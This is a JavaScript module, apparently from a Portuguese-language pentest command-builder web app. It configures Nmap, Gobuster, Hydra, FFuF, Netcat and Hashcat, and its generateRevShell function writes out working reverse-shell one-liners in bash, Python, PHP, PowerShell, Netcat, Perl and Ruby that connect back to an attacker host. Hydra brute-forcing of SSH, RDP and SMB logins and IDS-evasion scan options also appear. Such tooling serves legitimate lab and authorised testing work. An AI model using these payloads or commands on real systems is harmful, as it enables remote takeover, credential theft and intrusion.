export const TOOLS = [
  {
    id: 'nmap',
    name: 'Nmap',
    category: 'Reconhecimento',
    color: 'text-blue-400',
    border: 'border-blue-400/30',
    bg: 'bg-blue-400/10',
    description: 'Scanner de portas e deteção de serviços/OS',
    baseCommand: 'nmap',
    fields: [
      { id: 'target', label: 'Alvo', type: 'text', placeholder: '192.168.1.1 ou alvo.com', flag: '', required: true, position: 'end' },
      { id: 'ports',  label: 'Portas', type: 'text', placeholder: '1-1000 ou 80,443,8080 (vazio = top 1000)', flag: '-p' },
    ],
    flags: [
      { flag: '-sV',    label: 'Deteção de versão',     desc: 'Tenta identificar a versão dos serviços encontrados' },
      { flag: '-sS',    label: 'SYN Stealth Scan',      desc: 'Scan furtivo — envia SYN e não completa o handshake TCP (requer root)', group: 'scantype' },
      { flag: '-sT',    label: 'TCP Connect Scan',      desc: 'Handshake TCP completo — não precisa de root, mas é mais ruidoso', group: 'scantype' },
      { flag: '-sU',    label: 'UDP Scan',              desc: 'Verifica portas UDP abertas (bastante mais lento)' },
      { flag: '-sn',    label: 'Ping Scan',             desc: 'Só descoberta de hosts — não faz scan de portas', group: 'scantype' },
      { flag: '-O',     label: 'Deteção de OS',         desc: 'Tenta identificar o sistema operativo do alvo' },
      { flag: '-A',     label: 'Aggressive Scan',       desc: 'Ativa deteção de OS (-O), versão (-sV), scripts (-sC) e traceroute' },
      { flag: '-Pn',    label: 'Skip Host Discovery',   desc: 'Não faz ping — assume que o host está online' },
      { flag: '-p-',    label: 'All Ports',             desc: 'Verifica todas as portas TCP (1-65535)' },
      { flag: '-F',     label: 'Fast Scan',             desc: 'Scan rápido — apenas as 100 portas mais comuns' },
      { flag: '--open', label: 'Apenas abertas',        desc: 'Mostra apenas portas no estado open' },
      { flag: '-n',     label: 'Sem DNS',               desc: 'Não resolve nomes DNS — acelera o scan' },
      { flag: '-6',     label: 'IPv6',                  desc: 'Faz scan a alvos IPv6' },
      { flag: '-T0',    label: 'T0 — Paranoid',        desc: 'Extremamente lento — para evasão de IDS', group: 'timing' },
      { flag: '-T1',    label: 'T1 — Sneaky',          desc: 'Muito lento — também para evasão de IDS', group: 'timing' },
      { flag: '-T2',    label: 'T2 — Polite',          desc: 'Abranda para usar menos largura de banda e não sobrecarregar o alvo', group: 'timing' },
      { flag: '-T3',    label: 'T3 — Normal',          desc: 'Velocidade padrão do Nmap (predefinição)', group: 'timing' },
      { flag: '-T4',    label: 'T4 — Aggressive',      desc: 'Mais rápido — recomendado em redes locais/rápidas', group: 'timing' },
      { flag: '-T5',    label: 'T5 — Insane',          desc: 'Velocidade máxima — pode perder resultados', group: 'timing' },
      { flag: '-sC',    label: 'Default Scripts',       desc: 'Executa o conjunto de scripts NSE padrão (= --script=default)' },
      { flag: '--reason', label: 'Reason',              desc: 'Mostra o motivo pelo qual cada porta está naquele estado' },
      { flag: '-v',     label: 'Verbose',               desc: 'Aumenta o detalhe do output (podes repetir: -vv)' },
      { flag: '-oN output.txt', label: 'Guardar (normal)', desc: 'Guarda o output em formato normal num .txt', isRaw: true },
      { flag: '-oA output',     label: 'Guardar (todos)',  desc: 'Guarda em normal, XML e grepable de uma vez', isRaw: true },
    ]
  },
  {
    id: 'gobuster',
    name: 'Gobuster',
    category: 'Web Hacking',
    color: 'text-green-400',
    border: 'border-green-400/30',
    bg: 'bg-green-400/10',
    description: 'Brute-force de diretórios, ficheiros e DNS',
    baseCommand: 'gobuster',
    fields: [
      { id: 'mode', label: 'Modo', type: 'select', flag: '', position: 'after-base',
        options: [
          { value: 'dir',   label: 'dir — Diretórios/Ficheiros' },
          { value: 'dns',   label: 'dns — Subdomínios DNS' },
          { value: 'vhost', label: 'vhost — Virtual Hosts' },
        ]
      },
      { id: 'url',      label: 'URL / Domínio', type: 'text', placeholder: 'http://alvo.com', flag: '-u', required: true },
      { id: 'wordlist', label: 'Wordlist', type: 'text', placeholder: '/usr/share/wordlists/dirb/common.txt', flag: '-w', required: true, default: '/usr/share/wordlists/dirb/common.txt' },
      { id: 'threads',  label: 'Threads', type: 'text', placeholder: '50', flag: '-t', default: '50' },
      { id: 'ext',      label: 'Extensões', type: 'text', placeholder: 'php,html,txt', flag: '-x' },
    ],
    flags: [
      { flag: '-k',         label: 'Skip TLS Verify',  desc: 'Ignora erros de certificado SSL/TLS' },
      { flag: '--no-error', label: 'Sem erros',         desc: 'Suprime mensagens de erro no output' },
      { flag: '-q',         label: 'Quiet',             desc: 'Modo silencioso — só mostra resultados' },
      { flag: '-r',         label: 'Seguir Redirects',  desc: 'Segue redirecionamentos HTTP' },
    ]
  },
  {
    id: 'hydra',
    name: 'Hydra',
    category: 'Cracking',
    color: 'text-red-400',
    border: 'border-red-400/30',
    bg: 'bg-red-400/10',
    description: 'Brute-force de credenciais em múltiplos protocolos',
    baseCommand: 'hydra',
    fields: [
      { id: 'target',  label: 'Alvo (IP/Host)', type: 'text', placeholder: '192.168.1.1', flag: '', position: 'end-before-service', required: true },
      { id: 'service', label: 'Serviço', type: 'select', flag: '', position: 'end',
        options: [
          { value: 'ssh',      label: 'SSH' },
          { value: 'ftp',      label: 'FTP' },
          { value: 'http-get', label: 'HTTP GET' },
          { value: 'smb',      label: 'SMB' },
          { value: 'rdp',      label: 'RDP' },
          { value: 'mysql',    label: 'MySQL' },
          { value: 'telnet',   label: 'Telnet' },
        ]
      },
      { id: 'user',    label: 'Utilizador / Lista', type: 'text', placeholder: 'admin ou /path/users.txt', flag: '-l', required: true },
      { id: 'pass',    label: 'Password / Wordlist', type: 'text', placeholder: '/usr/share/wordlists/rockyou.txt', flag: '-P', required: true, default: '/usr/share/wordlists/rockyou.txt' },
      { id: 'port',    label: 'Porta (opcional)', type: 'text', placeholder: '22', flag: '-s' },
      { id: 'threads', label: 'Threads', type: 'text', placeholder: '16', flag: '-t', default: '16' },
    ],
    flags: [
      { flag: '-V',     label: 'Verbose',         desc: 'Mostra o login:password de cada tentativa' },
      { flag: '-f',     label: 'Stop on success', desc: 'Para após encontrar a primeira credencial válida' },
      { flag: '-S',     label: 'SSL',             desc: 'Liga por SSL/TLS (ex.: serviços em HTTPS)' },
      { flag: '-e nsr', label: 'Extra checks',    desc: 'Testa null, username como password, e reverse', isRaw: true },
    ]
  },
  {
    id: 'ffuf',
    name: 'FFuF',
    category: 'Web Hacking',
    color: 'text-yellow-400',
    border: 'border-yellow-400/30',
    bg: 'bg-yellow-400/10',
    description: 'Web fuzzer rápido para diretórios e parâmetros',
    baseCommand: 'ffuf',
    fields: [
      { id: 'url',      label: 'URL (usa FUZZ como placeholder)', type: 'text', placeholder: 'http://alvo.com/FUZZ', flag: '-u', required: true },
      { id: 'wordlist', label: 'Wordlist', type: 'text', placeholder: '/usr/share/wordlists/dirb/common.txt', flag: '-w', required: true, default: '/usr/share/wordlists/dirb/common.txt' },
      { id: 'threads',  label: 'Threads', type: 'text', placeholder: '40', flag: '-t', default: '40' },
      { id: 'ext',      label: 'Extensões', type: 'text', placeholder: '.php,.html', flag: '-e' },
      { id: 'fc',       label: 'Filtrar status', type: 'text', placeholder: '404,403', flag: '-fc' },
      { id: 'mc',       label: 'Match status', type: 'text', placeholder: '200,301,302,401,403', flag: '-mc' },
      { id: 'fs',       label: 'Filtrar tamanho', type: 'text', placeholder: 'ex: 42 ou 0-100', flag: '-fs' },
    ],
    flags: [
      { flag: '-recursion', label: 'Recursão',      desc: 'Faz fuzzing recursivo (a URL tem de terminar em FUZZ)' },
      { flag: '-ac',        label: 'Auto-calibrate', desc: 'Calibra filtros automaticamente para descartar respostas falsas/wildcard' },
      { flag: '-s',         label: 'Silent',    desc: 'Modo silencioso — só mostra resultados positivos' },
      { flag: '-v',         label: 'Verbose',   desc: 'Mostra URLs completas no output' },
    ]
  },
  {
    id: 'netcat',
    name: 'Netcat',
    category: 'Exploração',
    color: 'text-purple-400',
    border: 'border-purple-400/30',
    bg: 'bg-purple-400/10',
    description: 'Utilitário de rede — reverse shells, port scanning, transferência de ficheiros',
    baseCommand: 'nc',
    fields: [
      { id: 'mode', label: 'Modo', type: 'select', flag: '', position: 'after-base',
        options: [
          { value: '-lvnp', label: 'Listener (receber shell)' },
          { value: '',      label: 'Connect (ligar a host)' },
          { value: '-z',    label: 'Port Scan' },
        ]
      },
      { id: 'host', label: 'Host / IP', type: 'text', placeholder: '10.10.10.1', flag: '', position: 'end' },
      { id: 'port', label: 'Porta', type: 'text', placeholder: '4444', flag: '', position: 'end', required: true },
    ],
    flags: [
      { flag: '-v',           label: 'Verbose',       desc: 'Mostra mais informação sobre a ligação' },
      { flag: '-u',           label: 'UDP',           desc: 'Usa UDP em vez de TCP' },
      { flag: '-e /bin/bash', label: 'Execute shell', desc: 'Executa bash ao receber ligação (requer nc com -e)', isRaw: true },
    ]
  },
  {
    id: 'hashcat',
    name: 'Hashcat',
    category: 'Cracking',
    color: 'text-orange-400',
    border: 'border-orange-400/30',
    bg: 'bg-orange-400/10',
    description: 'Cracking de hashes com GPU — MD5, SHA, NTLM, bcrypt e mais',
    baseCommand: 'hashcat',
    fields: [
      { id: 'mode', label: 'Modo de ataque', type: 'select', flag: '-a',
        options: [
          { value: '0', label: '0 — Dictionary Attack' },
          { value: '1', label: '1 — Combination Attack' },
          { value: '3', label: '3 — Brute-force / Mask' },
          { value: '6', label: '6 — Hybrid Wordlist + Mask' },
          { value: '7', label: '7 — Hybrid Mask + Wordlist' },
        ]
      },
      { id: 'hashtype', label: 'Tipo de Hash (-m)', type: 'select', flag: '-m',
        options: [
          { value: '0',    label: '0 — MD5' },
          { value: '100',  label: '100 — SHA-1' },
          { value: '1400', label: '1400 — SHA-256' },
          { value: '1000', label: '1000 — NTLM' },
          { value: '3200', label: '3200 — bcrypt' },
          { value: '5600', label: '5600 — NetNTLMv2' },
          { value: '1700', label: '1700 — SHA-512' },
          { value: '1800', label: '1800 — sha512crypt (Linux $6$)' },
          { value: '22000', label: '22000 — WPA-PBKDF2 (Wi-Fi)' },
        ]
      },
      { id: 'hashfile', label: 'Ficheiro de hashes', type: 'text', placeholder: 'hashes.txt', flag: '', required: true },
      { id: 'wordlist',  label: 'Wordlist', type: 'text', placeholder: '/usr/share/wordlists/rockyou.txt', flag: '', default: '/usr/share/wordlists/rockyou.txt', showIf: v => ['0','1','6','7'].includes(v.mode || '0') },
      { id: 'wordlist2', label: 'Wordlist 2 (combinação)', type: 'text', placeholder: '/usr/share/wordlists/rockyou.txt', flag: '', showIf: v => (v.mode || '0') === '1' },
      { id: 'mask',      label: 'Máscara', type: 'text', placeholder: '?a?a?a?a  (ex.: ?l?l?l?d)', flag: '', showIf: v => ['3','6','7'].includes(v.mode || '0') },
    ],
    flags: [
      { flag: '--show',     label: 'Mostrar cracked',   desc: 'Exibe hashes já crackeados anteriormente' },
      { flag: '--force',    label: 'Force',             desc: 'Ignora avisos (útil em VMs sem GPU real)' },
      { flag: '--username', label: 'Com usernames',     desc: 'O ficheiro de hashes contém utilizador:hash' },
      { flag: '-O',         label: 'Optimized kernels', desc: 'Kernels otimizados — mais rápido mas limita comprimento' },
    ]
  },
  {
    id: 'revshell',
    name: 'Reverse Shell',
    category: 'Exploração',
    color: 'text-pink-400',
    border: 'border-pink-400/30',
    bg: 'bg-pink-400/10',
    description: 'Gerador de payloads de reverse shell',
    baseCommand: '',
    isGenerator: true,
    fields: [
      { id: 'lhost', label: 'LHOST (teu IP)', type: 'text', placeholder: '10.10.14.1', flag: '', required: true },
      { id: 'lport', label: 'LPORT (porta)',  type: 'text', placeholder: '4444', flag: '', required: true, default: '4444' },
      { id: 'shell', label: 'Tipo de shell', type: 'select', flag: '',
        options: [
          { value: 'bash',       label: 'Bash' },
          { value: 'python3',    label: 'Python 3' },
          { value: 'python2',    label: 'Python 2' },
          { value: 'php',        label: 'PHP' },
          { value: 'powershell', label: 'PowerShell' },
          { value: 'nc',         label: 'Netcat (mkfifo)' },
          { value: 'nc-e',       label: 'Netcat (-e)' },
          { value: 'perl',       label: 'Perl' },
          { value: 'ruby',       label: 'Ruby' },
        ]
      },
    ],
    flags: []
  },
]

export function generateRevShell(lhost, lport, type) {
  const shells = {
    bash:       `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
    python3:    `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    python2:    `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    php:        `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    powershell: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
    nc:         `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
    'nc-e':     `nc -e /bin/sh ${lhost} ${lport}`,
    perl:       `perl -e 'use Socket;$i="${lhost}";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    ruby:       `ruby -rsocket -e'f=TCPSocket.open("${lhost}",${lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
  }
  return shells[type] || ''
}

export function buildCommand(tool, fieldValues, selectedFlags) {
  if (tool.isGenerator) {
    return generateRevShell(
      fieldValues['lhost'] || '<LHOST>',
      fieldValues['lport'] || '<LPORT>',
      fieldValues['shell'] || 'bash'
    )
  }

  const parts = [tool.baseCommand]
  const endParts = []

  tool.fields.forEach(field => {
    const val = fieldValues[field.id] ?? (field.default || '')
    if (!val) return

    // A flag -p- (todas as portas) tem prioridade sobre o campo de portas
    if (field.id === 'ports' && selectedFlags.includes('-p-')) return

    // Caso especial Gobuster: o modo dns usa --domain (não -u) e -x só existe no modo dir
    if (tool.id === 'gobuster') {
      const mode = fieldValues['mode'] || 'dir'
      if (field.id === 'ext' && mode !== 'dir') return
      if (field.id === 'url' && mode === 'dns') {
        parts.push(`--domain ${val}`)
        return
      }
    }

    // Hashcat: os argumentos posicionais são montados à parte (ordem depende do modo)
    if (tool.id === 'hashcat' && ['hashfile', 'wordlist', 'wordlist2', 'mask'].includes(field.id)) return

    if (field.position === 'after-base') {
      parts.splice(1, 0, val)
    } else if (field.position === 'end') {
      endParts.push(val)
    } else if (field.position === 'end-before-service') {
      // tratado abaixo para Hydra
    } else if (field.flag) {
      parts.push(`${field.flag} ${val}`)
    }
  })

  // Caso especial Hydra
  if (tool.id === 'hydra') {
    const target  = fieldValues['target']  || '<alvo>'
    const service = fieldValues['service'] || 'ssh'
    endParts.push(target, service)
  }

  // Caso especial Hashcat: a ordem dos argumentos finais depende do modo (-a)
  if (tool.id === 'hashcat') {
    const mode     = fieldValues['mode'] || '0'
    const hashfile = fieldValues['hashfile'] || ''
    const wl       = fieldValues['wordlist'] ?? '/usr/share/wordlists/rockyou.txt'
    const wl2      = fieldValues['wordlist2'] || ''
    const mask     = fieldValues['mask'] || ''
    if (hashfile) endParts.push(hashfile)
    if (mode === '1')      { if (wl) endParts.push(wl); if (wl2) endParts.push(wl2) }
    else if (mode === '3') { if (mask) endParts.push(mask) }
    else if (mode === '6') { if (wl) endParts.push(wl); if (mask) endParts.push(mask) }
    else if (mode === '7') { if (mask) endParts.push(mask); if (wl) endParts.push(wl) }
    else                   { if (wl) endParts.push(wl) }  // modo 0 (dictionary)
  }

  selectedFlags.forEach(flag => parts.push(flag))

  return [...parts, ...endParts].filter(Boolean).join(' ')
}
